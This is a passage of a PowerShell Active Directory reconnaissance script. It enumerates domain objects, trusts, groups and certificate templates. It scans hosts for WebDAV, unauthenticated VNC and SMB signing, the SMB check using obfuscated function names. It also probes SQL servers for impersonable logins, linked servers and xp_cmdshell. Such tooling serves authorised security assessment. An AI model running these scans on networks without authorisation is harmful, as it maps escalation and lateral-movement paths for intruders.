            # Determine SID history status based on flags
            $SIDHistoryStatus = if ($TreatAsExternal -and $ForestTransitive) {
                'Enabled'
            } else {
                'Disabled'
            }

            # Create and output the custom object
            $trustInfo = New-Object PSObject -Property @{
                SourceName       = $Domain
                TargetName       = $result.Properties["trustPartner"][0]
                TrustDirection   = $Direction
                TrustType        = $TrustType
                TrustAttributes  = ($TrustAttributes -join ', ')
                SIDHistoryStatus = $SIDHistoryStatus
                Filter_SIDS      = $SIDFilteringEnabled
                WhenCreated      = $result.Properties["whenCreated"][0]
                WhenChanged      = $result.Properties["whenChanged"][0]
            }

            $trustInfo
        }
    }
    catch {
        Write-Error "An error occurred: $_"
    }
    finally {
        $searcher.Dispose()
        if ($results) { $results.Dispose() }
    }
}

# Load the necessary assemblies
Add-Type -AssemblyName System.DirectoryServices.AccountManagement
Add-Type -AssemblyName System.DirectoryServices

# Define the C# code for multithreaded processing
Add-Type -TypeDefinition @"
using System;
using System.Collections.Generic;
using System.Threading;
using System.Management.Automation;

namespace DataCollector
{
    public static class ProcessorClass
    {
        public static PSObject[] ProcessRecords(Dictionary<string, object>[] records, int numOfThreads)
        {
            Object[] results = ExecuteProcessing(records, numOfThreads);
            return Array.ConvertAll(results, item => (PSObject)item);
        }

        private static Object[] ExecuteProcessing(Dictionary<string, object>[] records, int numOfThreads)
        {
            int totalRecords = records.Length;
            IRecordHandler recordProcessor = new ActiveDirectoryRecordHandler();
            IResultsProcessor resultsHandler = new BasicResultsProcessor();
            int numberOfRecordsPerThread = totalRecords / numOfThreads;
            int remainders = totalRecords % numOfThreads;

            Thread[] threads = new Thread[numOfThreads];
            for (int i = 0; i < numOfThreads; i++)
            {
                int numberOfRecordsToProcess = numberOfRecordsPerThread;
                if (i == (numOfThreads - 1))
                {
                    numberOfRecordsToProcess += remainders;
                }

                Dictionary<string, object>[] sliceToProcess = new Dictionary<string, object>[numberOfRecordsToProcess];
                Array.Copy(records, i * numberOfRecordsPerThread, sliceToProcess, 0, numberOfRecordsToProcess);
                ProcessingThread processorThread = new ProcessingThread(i, recordProcessor, resultsHandler, sliceToProcess);
                threads[i] = new Thread(processorThread.ProcessThreadRecords);
                threads[i].Start();
            }
            foreach (Thread t in threads)
            {
                t.Join();
            }

            return resultsHandler.Complete();
        }

        class ProcessingThread
        {
            readonly int id;
            readonly IRecordHandler recordProcessor;
            readonly IResultsProcessor resultsHandler;
            readonly Dictionary<string, object>[] objectsToBeProcessed;

            public ProcessingThread(int id, IRecordHandler recordProcessor, IResultsProcessor resultsHandler, Dictionary<string, object>[] objectsToBeProcessed)
            {
                this.id = id;
                this.recordProcessor = recordProcessor;
                this.resultsHandler = resultsHandler;
                this.objectsToBeProcessed = objectsToBeProcessed;
            }

            public void ProcessThreadRecords()
            {
                for (int i = 0; i < objectsToBeProcessed.Length; i++)
                {
                    Object[] result = recordProcessor.ProcessRecord(objectsToBeProcessed[i]);
                    resultsHandler.ProcessResults(result);
                }
            }
        }

        interface IRecordHandler
        {
            PSObject[] ProcessRecord(Dictionary<string, object> record);
        }

        class ActiveDirectoryRecordHandler : IRecordHandler
        {
            public PSObject[] ProcessRecord(Dictionary<string, object> record)
            {
                try
                {
                    PSObject adObj = new PSObject();
                    foreach (var prop in record)
                    {
                        adObj.Members.Add(new PSNoteProperty(prop.Key, prop.Value));
                    }
                    return new PSObject[] { adObj };
                }
                catch (Exception e)
                {
                    Console.WriteLine("{0} Exception caught.", e);
                    return new PSObject[] { };
                }
            }
        }

        interface IResultsProcessor
        {
            void ProcessResults(Object[] t);
            Object[] Complete();
        }

        class BasicResultsProcessor : IResultsProcessor
        {
            private readonly Object lockObj = new Object();
            private readonly List<Object> processed = new List<Object>();

            public void ProcessResults(Object[] results)
            {
                lock (lockObj)
                {
                    if (results.Length != 0)
                    {
                        for (var i = 0; i < results.Length; i++)
                        {
                            processed.Add(results[i]);
                        }
                    }
                }
            }

            public Object[] Complete()
            {
                return processed.ToArray();
            }
        }
    }
}
"@

# Function to retrieve all AD objects and their properties
function Collect-ADObjects {
    param (
        [string]$Domain = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().Name,
        [string]$Server = $null,
        [int]$numOfThreads = 4,
		[Parameter(Mandatory = $false)]
        [ValidateSet("Users", "Computers", "Groups", "GPOs", "DomainControllers", "OUs", "Else", "Printers", "DomainPolicy", "OtherPolicies", "rIDManagers")]
        [string[]]$Collect = @("Users", "Computers", "Groups", "GPOs", "DomainControllers", "OUs", "Else", "Printers", "DomainPolicy", "OtherPolicies", "rIDManagers"),
		[string[]]$Property,
		[switch]$Enabled,
        [switch]$Disabled,
		[string]$Identity,
		[string]$LDAP
    )
	
	$root = if ($Server) {
        "LDAP://$Server"
    } else {
        "LDAP://$Domain"
    }
	
	$rootDirectoryEntry = New-Object System.DirectoryServices.DirectoryEntry($root)
    $searcher = New-Object System.DirectoryServices.DirectorySearcher($rootDirectoryEntry)
	
	# Construct the LDAP filter based on the -Collect parameter
    $filters = @()
	if ($Identity) {
        $filters += "(samAccountName=$Identity)"
    }
	elseif ($LDAP) {
        $filters += "($LDAP)"
    }
	else{
		foreach ($item in $Collect) {
			switch ($item) {
				"Users" { 
					$userFilter = "(objectCategory=person)"
					if ($Enabled) {
						$userFilter = "(&" + $userFilter + "(!(userAccountControl:1.2.840.113556.1.4.803:=2)))"
					} elseif ($Disabled) {
						$userFilter = "(&" + $userFilter + "(userAccountControl:1.2.840.113556.1.4.803:=2))"
					}
					$filters += $userFilter
				}
				"Computers" { 
					$computerFilter = "(objectCategory=computer)"
					if ($Enabled) {
						$computerFilter = "(&" + $computerFilter + "(!(userAccountControl:1.2.840.113556.1.4.803:=2)))"
					} elseif ($Disabled) {
						$computerFilter = "(&" + $computerFilter + "(userAccountControl:1.2.840.113556.1.4.803:=2))"
					}
					$filters += $computerFilter
				}
				"Groups" { $filters += "(objectCategory=group)" }
				"DomainControllers" { $filters += "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=8192))" }
				"OUs" { $filters += "(objectCategory=organizationalUnit)" }
				"GPOs" { $filters += "(objectClass=groupPolicyContainer)" }
				"Else" { $filters += "(&(!(objectCategory=person))(!(objectCategory=computer))(!(objectCategory=group))(!(objectCategory=organizationalUnit))(!(objectClass=groupPolicyContainer)))" }
				"Printers" { $filters += "(objectCategory=printQueue)" }
                "DomainPolicy" { $filters += "(objectClass=domainDNS)" }
                "OtherPolicies" { $filters += "(cn=Policies*)" }
				"rIDManagers" { $filters += "(objectClass=rIDManager)" }
			}
		}
	}
    # Combine the filters with an OR if multiple categories are specified
    $searcher.Filter = if ($filters.Count -gt 1) { "(|" + ($filters -join "") + ")" } else { $filters[0] }
	
    # Specify the properties to load if provided
    if ($Property) {
        $Property += "domain"  # Ensure 'domain' is always collected
        foreach ($prop in $Property) {
            $null = $searcher.PropertiesToLoad.Add($prop)
        }
    }
	
	$searcher.PageSize = 1000
	$searcher.SearchScope = [System.DirectoryServices.SearchScope]::Subtree
    $results = $searcher.FindAll()

    [System.Collections.Generic.List[PSObject]]$records = New-Object 'System.Collections.Generic.List[PSObject]'
    foreach ($result in $results) {
        $properties = @{}
        foreach ($prop in $result.Properties.PropertyNames) {
            if ($result.Properties[$prop].Count -gt 1) {
                $properties[$prop] = $result.Properties[$prop]
            } else {
                $properties[$prop] = $result.Properties[$prop][0]
            }
        }
		$properties['domain'] = $Domain
        $records.Add([PSCustomObject]$properties)
    }

    # Convert the records to Dictionary<string, object> for the C# code
    [System.Collections.Generic.List[System.Collections.Generic.Dictionary[string, object]]]$recordsArray = New-Object 'System.Collections.Generic.List[System.Collections.Generic.Dictionary[string, object]]'
    foreach ($record in $records) {
        $dict = New-Object 'System.Collections.Generic.Dictionary[String, Object]'
        foreach ($prop in $record.PSObject.Properties) {
            $dict.Add($prop.Name, $prop.Value)
        }
        $recordsArray.Add($dict)
    }

    $CollectedResults = [DataCollector.ProcessorClass]::ProcessRecords($recordsArray, $numOfThreads)
    
    return $CollectedResults
}

function RecursiveGroupMembers {
    param (
        [Parameter(Mandatory = $true)]
        [string]$Identity,
		[Parameter(Mandatory = $false)]
        [string]$Domain,
		[Parameter(Mandatory = $false)]
        [switch]$Raw,
        [Parameter(Mandatory = $true)]
        [array]$AllADObjects
    )

    if($Domain){$AllADObjects = $AllADObjects | Where-Object {$_.domain -eq $Domain}}
	
	if($Raw){
		$processedGroups = @()
		$memberList = New-Object System.Collections.Generic.List[object]

		function Process-Group {
			param ([string]$Identity)

			# Prevent processing the same group more than once
			if ($Identity -in $processedGroups) { return }
			$processedGroups += $Identity

			# Find the group object
			$group = $AllADObjects | Where-Object { $_.name -eq $Identity -and ($_.objectClass -contains 'group' -or $_.objectCategory -like '*Group*') }

			# Get direct members of the group
			$members = $group.member

			foreach ($member in $members) {
				$memberObject = $AllADObjects | Where-Object { $_.distinguishedName -eq $member }

				# Add the member to the list if not already present
				if ($memberObject -and -not ($memberList.Contains($memberObject))) {
					$memberList.Add($memberObject)
					# If the member is also a group, process it recursively
					if ($memberObject.objectClass -contains 'group' -or $memberObject.objectCategory -like '*Group*') {
						Process-Group -Identity $memberObject.name
					}
				}
			}
		}

		Process-Group -Identity $Identity

		return $memberList
	}
	
	else{
		$processedGroups = New-Object System.Collections.Generic.HashSet[string]
		$memberList = New-Object System.Collections.Generic.List[object]

		function Process-Group {
			param ([string]$Identity)

			# Prevent processing the same group more than once
			if (-not $processedGroups.Add($Identity)) { return }

			# Find the group object
			$group = $AllADObjects | Where-Object { $_.name -eq $Identity -and ($_.objectClass -contains 'group' -or $_.objectCategory -like '*Group*') }

			if ($group) {
				# Get direct members of the group
				$members = $group.member

				foreach ($member in $members) {
					$memberObject = $AllADObjects | Where-Object { $_.distinguishedName -eq $member }

					if ($memberObject) {
						# Extract the most specific object class
						$mostSpecificObjectClass = @($memberObject.objectClass)[-1]
						
						# Create a custom PSObject with the desired properties
						$memberDetails = [PSCustomObject]@{
							GroupDomain             = $group.domain
							GroupName               = $group.name
							GroupDistinguishedName  = $group.distinguishedName
							MemberDomain            = $memberObject.domain
							MemberName              = $memberObject.samaccountname
							MemberDistinguishedName = $memberObject.distinguishedName
							MemberObjectClass       = $mostSpecificObjectClass
							MemberSID               = GetSID-FromBytes -sidBytes $memberObject.objectsid
						}

						$memberList.Add($memberDetails)

						# If the member is also a group, process it recursively
						if ($memberObject.objectClass -contains 'group' -or $memberObject.objectCategory -like '*Group*') {
							Process-Group -Identity $memberObject.name
						}
					}
				}
			}
		}

		Process-Group -Identity $Identity

		return $memberList
	}
	
}

function Collect-ADCertificateTemplates {
    param (
        [Parameter(Mandatory = $true)]
        [string]$Domain,
		
		[Parameter(Mandatory = $false)]
        [string]$Server
    )

    $certificateTemplates = @()

    # Check binding to the directory entry
    try {
		$domainDistinguishedName = "DC=" + ($Domain -replace "\.", ",DC=")
		$ldapPath = "LDAP://"
		if ($PSBoundParameters.ContainsKey('Server')) {
            $ldapPath += "$Server/"
        }
		$ldapPath += "CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,$domainDistinguishedName"
		
		$ldapConnection = New-Object System.DirectoryServices.DirectoryEntry
		$ldapConnection.Path = $ldapPath
		
        $searcher = New-Object System.DirectoryServices.DirectorySearcher
		$searcher.SearchRoot = $ldapConnection
		$searcher.Filter = "(objectClass=pKICertificateTemplate)"
		$searcher.SearchScope = "Subtree"
		$searcher.PageSize = 1000
		$searcher.PropertiesToLoad.Add("*") | Out-Null
		
        $results = $searcher.FindAll()

        foreach ($result in $results) {
			$properties = $result.Properties
			$template = New-Object PSObject
			foreach ($propertyName in $properties.PropertyNames) {
				$value = if ($properties[$propertyName].Count -eq 1) { $properties[$propertyName][0] } else { $properties[$propertyName] }
				$template | Add-Member -NotePropertyName $propertyName -NotePropertyValue $value
			}
			# Add the "domain" property to the template object
			$template | Add-Member -NotePropertyName "domain" -NotePropertyValue $Domain
			$certificateTemplates += $template
		}
    } catch {} 
	finally {
        if ($searcher) { $searcher.Dispose() }
        if ($rootDSE) { $rootDSE.Close() }
    }

    return $certificateTemplates
}

function CheckWebDAVStatus
{
	
    [CmdletBinding()] Param(

 	[Parameter (Mandatory=$False, Position = 1, ValueFromPipeline=$true)]
        [PSObject[]]
        $Targets

 	)
	
	# Initialize the runspace pool
	$runspacePool = [runspacefactory]::CreateRunspacePool(1, 10)
	$runspacePool.Open()

	# Define the script block outside the loop for better efficiency
	$scriptBlock = {
		param ($computer)
		
		$source = @"
using System;
using System.Runtime.InteropServices;

namespace DynamicTypes {
    public class PipeChecker {
        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool WaitNamedPipeA(string lpNamedPipeName, uint nTimeOut);
    }
}
"@

Add-Type -TypeDefinition $source -Language CSharp

		function CheckDAVPipe {
			param (
				[Parameter(Mandatory = $true)]
				[string]$TargetHost
			)

			$pipename = "\\$TargetHost\pipe\DAV RPC SERVICE"
			$davActive = [DynamicTypes.PipeChecker]::WaitNamedPipeA($pipename, 100)

			if ($davActive) {
				Write-Output "$TargetHost"
			}
		}
		
		$Result = CheckDAVPipe -TargetHost $computer.dnshostname
		if($Result){return $computer}
		return $null
	}

	# Use a generic list for better performance when adding items
	$runspaces = New-Object 'System.Collections.Generic.List[System.Object]'

	foreach ($computer in $Targets) {
		$powerShellInstance = [powershell]::Create().AddScript($scriptBlock).AddArgument($computer)
		$powerShellInstance.RunspacePool = $runspacePool
		$runspaces.Add([PSCustomObject]@{
			Instance = $powerShellInstance
			Status   = $powerShellInstance.BeginInvoke()
		})
	}

	# Collect the results
	$WebDAVStatusEnabled = @()
	foreach ($runspace in $runspaces) {
		$result = $runspace.Instance.EndInvoke($runspace.Status)
		if ($result) {
			$WebDAVStatusEnabled += $result
		}
	}

	if($WebDAVStatusEnabled){$WebDAVStatusEnabled}

	# Close and dispose of the runspace pool for good resource management
	$runspacePool.Close()
	$runspacePool.Dispose()
}

function SQL-Query {
	param (
		[string]$Server,
		[string]$Database = "master"
	)
	
	$access = $null
	$loggedInUser = $null
	$dbUser = $null
	$rolesResults = $null
	$impersonationResults = $null
	$xpCmdShellStatus = "N/A"
	$oleAutomationStatus = "N/A"
	$clrStatus = "N/A"
	$rpcOutStatus = "N/A"
	$serviceAccount = "N/A"

	# Connection string
	$connectionString = "Server=$Server;Database=$Database;Integrated Security=True;Connection Timeout=2;"
	$connection = New-Object System.Data.SqlClient.SqlConnection $connectionString

	try {
		$connection.Open()
		$access = $true
	} catch {
		$access = $false
	}
	
	if ($access) {
		# Function to execute a query and fetch a single result
		function ExecuteQuery {
			param ($query)
			$command = $connection.CreateCommand()
			$command.CommandText = $query
			$reader = $command.ExecuteReader()
			$result = $null
			if ($reader.Read()) {
				$result = $reader[0]
			}
			$reader.Close()
			return $result
		}

		# Fetch the SQL login
		$loggedInUser = ExecuteQuery "SELECT SYSTEM_USER;"

		# Fetch the username (database user)
		$dbUser = ExecuteQuery "SELECT USER_NAME();"

		# Check if user is part of various server roles
		$roles = @("public", "sysadmin", "securityadmin", "serveradmin", "dbcreator", "diskadmin", "processadmin", "setupadmin", "bulkadmin")
		$rolesResults = @()
		foreach ($role in $roles) {
			$isMember = ExecuteQuery "SELECT IS_SRVROLEMEMBER('$role');"
			if ($isMember -eq 1) {
				$rolesResults += $role
			}
		}
		
		if ($rolesResults.count -gt 0) {
			$rolesResults = $rolesResults -join ", "
		} else {
			$rolesResults = "None"
		}

		# Logins that can be impersonated
		$impersonateQuery = "SELECT DISTINCT b.name FROM sys.server_permissions a " +
							"INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id " +
							"WHERE a.permission_name = 'IMPERSONATE';"

		$command = $connection.CreateCommand()
		$command.CommandText = $impersonateQuery
		$reader = $command.ExecuteReader()
		
		$impersonationResults = @()
		
		while ($reader.Read()) {
			$impersonationResults += $($reader[0])
		}
		$reader.Close()
		
		if ($impersonationResults.count -gt 0) {
			$impersonationResults = $impersonationResults -join ", "
		} else {
			$impersonationResults = "none"
		}
		
		# Linked Servers
		$execCmd = "EXEC sp_linkedservers;"
		$command = $connection.CreateCommand()
		$command.CommandText = $execCmd
		$reader = $command.ExecuteReader()

		# Array to store linked server names
		$linkedServers = @()

		# Retrieve linked servers and store them in the array
		while ($reader.Read()) {
			$linkedServers += $reader[0]
		}
		$reader.Close()
		
		if ($linkedServers.Count -gt 0) {
			$linkedServers = $linkedServers -join ", "
		} else {
			$linkedServers = "none"
		}

		# Check xp_cmdshell status
		$xpCmdShellStatus = ExecuteQuery "SELECT value FROM sys.configurations WHERE name = 'xp_cmdshell';"
		if ($xpCmdShellStatus -eq 1) {
			$xpCmdShellStatus = "Enabled"
		} else {
			$xpCmdShellStatus = "Disabled"
		}

		# Check OLE Automation Procedures status
		$oleAutomationStatus = ExecuteQuery "SELECT value FROM sys.configurations WHERE name = 'Ole Automation Procedures';"
		if ($oleAutomationStatus -eq 1) {
			$oleAutomationStatus = "Enabled"
		} else {
			$oleAutomationStatus = "Disabled"
		}

		# Check CLR status
		$clrStatus = ExecuteQuery "SELECT value FROM sys.configurations WHERE name = 'clr enabled';"
		if ($clrStatus -eq 1) {
			$clrStatus = "Enabled"
		} else {
			$clrStatus = "Disabled"
		}

		# Check RPC Out status
		$rpcOutStatus = ExecuteQuery "SELECT is_rpc_out_enabled FROM sys.servers WHERE name = @@SERVERNAME;"
		if ($rpcOutStatus -eq 1) {
			$rpcOutStatus = "Enabled"
		} else {
			$rpcOutStatus = "Disabled"
		}
		
		# Fetch the service account using xp_instance_regread
        $serviceAccountQuery = @"
DECLARE @SQLServerInstance NVARCHAR(255)
DECLARE @ServiceAccountName NVARCHAR(255)

IF @@SERVICENAME = 'MSSQLSERVER'
    SET @SQLServerInstance = 'SYSTEM\CurrentControlSet\Services\MSSQLSERVER'
ELSE
    SET @SQLServerInstance = 'SYSTEM\CurrentControlSet\Services\MSSQL$' + CAST(@@SERVICENAME AS NVARCHAR(255))

EXEC master.dbo.xp_instance_regread
    N'HKEY_LOCAL_MACHINE',
    @SQLServerInstance,
    N'ObjectName',
    @ServiceAccountName OUTPUT

SELECT @ServiceAccountName AS [ServiceAccount]
"@
        try {
            $serviceAccounts = ExecuteQuery $serviceAccountQuery
            if ($serviceAccounts.Count -gt 0) {
                $serviceAccount = $serviceAccounts -join ", "
            } else {
                $serviceAccount = "Not available"
            }
        } catch {
            $serviceAccount = "Error retrieving service account"
        }

		# Close connection
		$connection.Close()
		
		$MSSQLResults = [PSCustomObject]@{
			"Access"        = $access
			"Identity"      = $loggedInUser
			"Mapped to"     = $dbUser
			"Roles"         = $rolesResults
			"Impersonate"   = $impersonationResults
			"Links"         = $linkedServers
			"xp_cmdshell"   = $xpCmdShellStatus
			"OLE Automation"= $oleAutomationStatus
			"CLR Enabled"   = $clrStatus
			"RPC Out"       = $rpcOutStatus
			"Service Account"= $serviceAccount
		}
		
		$MSSQLResults
	}
	else {
		# Return default values when access is not available
		$MSSQLResults = [PSCustomObject]@{
			"Access"        = $access
			"Identity"      = "N/A"
			"Mapped to"     = "N/A"
			"Roles"         = "N/A"
			"Impersonate"   = "N/A"
			"Links"         = "N/A"
			"xp_cmdshell"   = "N/A"
			"OLE Automation"= "N/A"
			"CLR Enabled"   = "N/A"
			"RPC Out"       = "N/A"
			"Service Account"= "N/A"
		}
		
		$MSSQLResults
	}
}

function VNCUnauthAccess
{
	
    [CmdletBinding()] Param(

 	[Parameter (Mandatory=$False, Position = 1, ValueFromPipeline=$true)]
        [PSObject[]]
        $Targets

 	)
	
	# Initialize the runspace pool
	$runspacePool = [runspacefactory]::CreateRunspacePool(1, 10)
	$runspacePool.Open()

	# Define the script block outside the loop for better efficiency
	$scriptBlock = {
		param ($computer)
		
		function VNC-NoAuth {
			param([string]$ComputerName)
			$tcpClient = $null
			$networkStream = $null
			try {
				$tcpClient = New-Object System.Net.Sockets.TcpClient
				$asyncResult = $tcpClient.BeginConnect($ComputerName, 5900, $null, $null)
				$wait = $asyncResult.AsyncWaitHandle.WaitOne(50)
				if(!$wait){return}
				try {$tcpClient.EndConnect($asyncResult)}
				catch {return}

				$networkStream = $tcpClient.GetStream()
				$networkStream.ReadTimeout = 50
				
				# Reading Version from Server
				$buffer = New-Object byte[] 12
				$read = $networkStream.Read($buffer, 0, 12)
				if ($read -eq 0) { return }
				$serverVersionMessage = [System.Text.Encoding]::ASCII.GetString($buffer, 0, $read)
				
				# Sending Client Version
				$buffer = [System.Text.Encoding]::ASCII.GetBytes($serverVersionMessage)
				$networkStream.Write($buffer, 0, $buffer.Length)

				# Reading Supported Security Types
				$buffer = New-Object byte[] 2
				$read = $networkStream.Read($buffer, 0, 1)
				if ($read -eq 0) { return }
				$numberOfSecTypes = $buffer[0]
				$buffer = New-Object byte[] $numberOfSecTypes
				$read = $networkStream.Read($buffer, 0, $numberOfSecTypes)
				if ($read -eq 0) { return }
			}
			catch {return}
			finally {
				# Cleanup
				if ($null -ne $networkStream) { $networkStream.Close() }
				if ($null -ne $tcpClient) { $tcpClient.Close() }
			}

			# Check for Non-authentication (Type 1)
			if ($buffer -contains 1) {return "Supported"}
			else {return "Not Supported"}
		}
		
		$Result = VNC-NoAuth -ComputerName $computer.dnshostname
		if($Result -eq "Supported"){return $computer}
		return $null
	}

	# Use a generic list for better performance when adding items
	$runspaces = New-Object 'System.Collections.Generic.List[System.Object]'

	foreach ($computer in $Targets) {
		$powerShellInstance = [powershell]::Create().AddScript($scriptBlock).AddArgument($computer)
		$powerShellInstance.RunspacePool = $runspacePool
		$runspaces.Add([PSCustomObject]@{
			Instance = $powerShellInstance
			Status   = $powerShellInstance.BeginInvoke()
		})
	}

	# Collect the results
	$WebDAVStatusEnabled = @()
	foreach ($runspace in $runspaces) {
		$result = $runspace.Instance.EndInvoke($runspace.Status)
		if ($result) {
			$WebDAVStatusEnabled += $result
		}
	}

	if($WebDAVStatusEnabled){$WebDAVStatusEnabled}

	# Close and dispose of the runspace pool for good resource management
	$runspacePool.Close()
	$runspacePool.Dispose()
}

function CheckSMBSigning
{
    [CmdletBinding()] Param(

 	[Parameter (Mandatory=$False, Position = 1, ValueFromPipeline=$true)]
        [PSObject[]]
        $Targets
 	)
	
	# Initialize the runspace pool
	$runspacePool = [runspacefactory]::CreateRunspacePool(1, 10)
	$runspacePool.Open()

	# Define the script block outside the loop for better efficiency
	$scriptBlock = {
		param ($computer)
		
		Function F5A6B8D8B  {

			Param (
				[String]$A1,
				[Float]$A3,
				[Float]$A4
			) 

			function B3C4D5E6
			{
				param($B)

				ForEach($C in $B.Values)
				{
					$D += $C
				}

				return $D
			}

			function E4F5G6H7()
			{
				param([Int]$E,[Int]$F)

				[Byte[]]$G = [System.BitConverter]::GetBytes($E + $F)
				$G = $G[2..0]

				$H = New-Object System.Collections.Specialized.OrderedDictionary
				$H.Add("A1",[Byte[]](0x00))
				$H.Add("A2",[Byte[]]($G))

				return $H
			}

			function H7I8J9K0()
			{
				param([Byte[]]$I,[Byte[]]$J,[Byte[]]$K,[Byte[]]$L,[Byte[]]$M,[Byte[]]$N)

				$O = New-Object System.Collections.Specialized.OrderedDictionary
				$O.Add("B1",[Byte[]](0xff,0x53,0x4d,0x42))
				$O.Add("B2",$I)
				$O.Add("B3",[Byte[]](0x00))
				$O.Add("B4",[Byte[]](0x00))
				$O.Add("B5",[Byte[]](0x00,0x00))
				$O.Add("B6",$J)
				$O.Add("B7",$K)
				$O.Add("B8",[Byte[]](0x00,0x00))
				$O.Add("B9",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
				$O.Add("C1",[Byte[]](0x00,0x00))
				$O.Add("C2",$L)
				$O.Add("C3",$M)
				$O.Add("C4",$N)
				$O.Add("C5",[Byte[]](0x00,0x00))

				return $O
			}

			function J8K9L0M1()
			{
				param([String]$P)

				if($P -eq "SMB1")
				{
					[Byte[]]$Q = 0x0c,0x00
				}
				else
				{
					[Byte[]]$Q = 0x22,0x00  
				}

				$R = New-Object System.Collections.Specialized.OrderedDictionary
				$R.Add("D1",[Byte[]](0x00))
				$R.Add("D2",$Q)
				$R.Add("D3",[Byte[]](0x02))
				$R.Add("D4",[Byte[]](0x4e,0x54,0x20,0x4c,0x4d,0x20,0x30,0x2e,0x31,0x32,0x00))

				if($P -ne "SMB1")
				{
					$R.Add("D5",[Byte[]](0x02))
					$R.Add("D6",[Byte[]](0x53,0x4d,0x42,0x20,0x32,0x2e,0x30,0x30,0x32,0x00))
					$R.Add("D7",[Byte[]](0x02))
					$R.Add("D8",[Byte[]](0x53,0x4d,0x42,0x20,0x32,0x2e,0x3f,0x3f,0x3f,0x00))
				}

				return $R
			}

			function K9L0M1N2()
			{
				param([Byte[]]$S)

				[Byte[]]$T = [System.BitConverter]::GetBytes($S.Length)
				$T = $T[0,1]
				[Byte[]]$U = [System.BitConverter]::GetBytes($S.Length + 5)
				$U = $U[0,1]

				$V = New-Object System.Collections.Specialized.OrderedDictionary
				$V.Add("E1",[Byte[]](0x0c))
				$V.Add("E2",[Byte[]](0xff))
				$V.Add("E3",[Byte[]](0x00))
				$V.Add("E4",[Byte[]](0x00,0x00))
				$V.Add("E5",[Byte[]](0xff,0xff))
				$V.Add("E6",[Byte[]](0x02,0x00))
				$V.Add("E7",[Byte[]](0x01,0x00))
				$V.Add("E8",[Byte[]](0x00,0x00,0x00,0x00))
				$V.Add("E9",$T)
				$V.Add("F1",[Byte[]](0x00,0x00,0x00,0x00))
				$V.Add("F2",[Byte[]](0x44,0x00,0x00,0x80))
				$V.Add("F3",$U)
				$V.Add("F4",$S)
				$V.Add("F5",[Byte[]](0x00,0x00,0x00))
				$V.Add("F6",[Byte[]](0x00,0x00))

				return $V 
			}

			function L0M1N2O3()
			{
				param([Byte[]]$W)

				[Byte[]]$X = [System.BitConverter]::GetBytes($W.Length + 7)
				$X = $X[0,1]

				$Y = New-Object System.Collections.Specialized.OrderedDictionary
				$Y.Add("G1",[Byte[]](0x04))
				$Y.Add("G2",[Byte[]](0xff))
				$Y.Add("G3",[Byte[]](0x00))
				$Y.Add("G4",[Byte[]](0x00,0x00))
				$Y.Add("G5",[Byte[]](0x00,0x00))
				$Y.Add("G6",[Byte[]](0x01,0x00))
				$Y.Add("G7",$X)
				$Y.Add("G8",[Byte[]](0x00))
				$Y.Add("G9",$W)
				$Y.Add("H1",[Byte[]](0x3f,0x3f,0x3f,0x3f,0x3f,0x00))

				return $Y
			}

			function M1N2O3P4()
			{
				param([Byte[]]$Z)

				[Byte[]]$AA = [System.BitConverter]::GetBytes($Z.Length)
				$AA = $AA[0,1]
				[Byte[]]$BB = [System.BitConverter]::GetBytes($Z.Length - 1)
				$BB = $BB[0,1]

				$CC = New-Object System.Collections.Specialized.OrderedDictionary
				$CC.Add("I1",[Byte[]](0x18))
				$CC.Add("I2",[Byte[]](0xff))
				$CC.Add("I3",[Byte[]](0x00))
				$CC.Add("I4",[Byte[]](0x00,0x00))
				$CC.Add("I5",[Byte[]](0x00))
				$CC.Add("I6",$BB)
				$CC.Add("I7",[Byte[]](0x16,0x00,0x00,0x00))
				$CC.Add("I8",[Byte[]](0x00,0x00,0x00,0x00))
				$CC.Add("I9",[Byte[]](0x00,0x00,0x00,0x02))
				$CC.Add("J1",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
				$CC.Add("J2",[Byte[]](0x00,0x00,0x00,0x00))
				$CC.Add("J3",[Byte[]](0x07,0x00,0x00,0x00))
				$CC.Add("J4",[Byte[]](0x01,0x00,0x00,0x00))
				$CC.Add("J5",[Byte[]](0x00,0x00,0x00,0x00))
				$CC.Add("J6",[Byte[]](0x02,0x00,0x00,0x00))
				$CC.Add("J7",[Byte[]](0x00))
				$CC.Add("J8",$AA)
				$CC.Add("J9",$Z)

				return $CC
			}

			function N2O3P4Q5()
			{
				$DD = New-Object System.Collections.Specialized.OrderedDictionary
				$DD.Add("K1",[Byte[]](0x0a))
				$DD.Add("K2",[Byte[]](0xff))
				$DD.Add("K3",[Byte[]](0x00))
				$DD.Add("K4",[Byte[]](0x00,0x00))
				$DD.Add("K5",[Byte[]](0x00,0x40))
				$DD.Add("K6",[Byte[]](0x00,0x00,0x00,0x00))
				$DD.Add("K7",[Byte[]](0x58,0x02))
				$DD.Add("K8",[Byte[]](0x58,0x02))
				$DD.Add("K9",[Byte[]](0xff,0xff,0xff,0xff))
				$DD.Add("L1",[Byte[]](0x00,0x00))
				$DD.Add("L2",[Byte[]](0x00,0x00))

				return $DD
			}

			function O3P4Q5R6()
			{
				param([Byte[]]$EE,[Int]$FF)

				[Byte[]]$GG = [System.BitConverter]::GetBytes($FF)
				$GG = $GG[0,1]

				$HH = New-Object System.Collections.Specialized.OrderedDictionary
				$HH.Add("M1",[Byte[]](0x0e))
				$HH.Add("M2",[Byte[]](0xff))
				$HH.Add("M3",[Byte[]](0x00))
				$HH.Add("M4",[Byte[]](0x00,0x00))
				$HH.Add("M5",$EE)
				$HH.Add("M6",[Byte[]](0xea,0x03,0x00,0x00))
				$HH.Add("M7",[Byte[]](0xff,0xff,0xff,0xff))
				$HH.Add("M8",[Byte[]](0x08,0x00))
				$HH.Add("M9",$GG)
				$HH.Add("N1",[Byte[]](0x00,0x00))
				$HH.Add("N2",$GG)
				$HH.Add("N3",[Byte[]](0x3f,0x00))
				$HH.Add("N4",[Byte[]](0x00,0x00,0x00,0x00))
				$HH.Add("N5",$GG)

				return $HH
			}

			function P4Q5R6S7()
			{
				param ([Byte[]]$II)

				$JJ = New-Object System.Collections.Specialized.OrderedDictionary
				$JJ.Add("O1",[Byte[]](0x03))
				$JJ.Add("O2",$II)
				$JJ.Add("O3",[Byte[]](0xff,0xff,0xff,0xff))
				$JJ.Add("O4",[Byte[]](0x00,0x00))

				return $JJ
